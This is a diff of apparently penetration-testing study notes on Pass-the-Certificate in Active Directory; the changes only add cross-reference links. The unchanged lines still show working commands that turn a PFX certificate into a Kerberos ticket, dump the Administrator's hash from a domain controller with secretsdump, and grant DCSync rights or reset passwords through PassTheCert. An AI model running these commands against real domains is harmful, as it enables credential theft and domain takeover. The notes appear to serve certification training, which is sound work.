@@ -22,7 +22,7 @@ You have a certificate (a `.pfx`/PKCS#12, often with its password) for a domain 
 
 ## Key tools and flags
 
-- `gettgtpkinit.py` (PKINITtools): `-cert-pfx file.pfx -pfx-pass PASS DOMAIN/user /tmp/user.ccache` — request a TGT from a certificate.
+- `gettgtpkinit.py` ([PKINITtools](/cpts/#tool-pkinittools)): `-cert-pfx file.pfx -pfx-pass PASS DOMAIN/user /tmp/user.ccache` — request a TGT from a certificate.
 - `certipy auth -pfx file.pfx -dc-ip TARGET` does the same from the Certipy toolkit, and also recovers the NT hash via U2U.
 - `export KRB5CCNAME=/tmp/user.ccache` then use any `-k` tool (see [Pass the Ticket (Linux)](/cpts/#tool-linux-ticket-abuse)).
 - The AS-REP encryption key printed by `gettgtpkinit` is needed by `getnthash.py` if you want the NT hash out of the ticket.
@@ -42,7 +42,7 @@ export KRB5CCNAME=/tmp/dc.ccache
 impacket-secretsdump -k -no-pass -dc-ip TARGET -just-dc-user Administrator 'DOMAIN/DC01$'@dc01.DOMAIN
 ```
 
-When PKINIT is unavailable (KDC lacks the right EKU), authenticate to LDAPS with the cert instead:
+When PKINIT is unavailable (KDC lacks the right EKU), authenticate to LDAPS with the cert instead ([PassTheCert](/cpts/#tool-passthecert)):
 
 ```bash
 # PassTheCert: e.g. grant yourself DCSync or reset a password over LDAPS
@@ -55,7 +55,7 @@ python3 passthecert.py -action ... -crt cert.crt -key cert.key -domain DOMAIN -d
 2. Run `gettgtpkinit.py` (or `certipy auth`) to turn the PFX into a `.ccache` TGT.
 3. `export KRB5CCNAME` and confirm with `klist`.
 4. Act as the account — DCSync with [secretsdump](/cpts/#tool-secretsdump), a shell with [Evil-WinRM](/cpts/#tool-evil-winrm) `-r`, or anything `-k`-aware.
-5. If PKINIT fails on EKU grounds, fall back to **PassTheCert** over LDAPS to change a password or grant DCSync rights.
+5. If PKINIT fails on EKU grounds, fall back to [PassTheCert](/cpts/#tool-passthecert) over LDAPS to change a password or grant DCSync rights.
 
 ## Notes
 
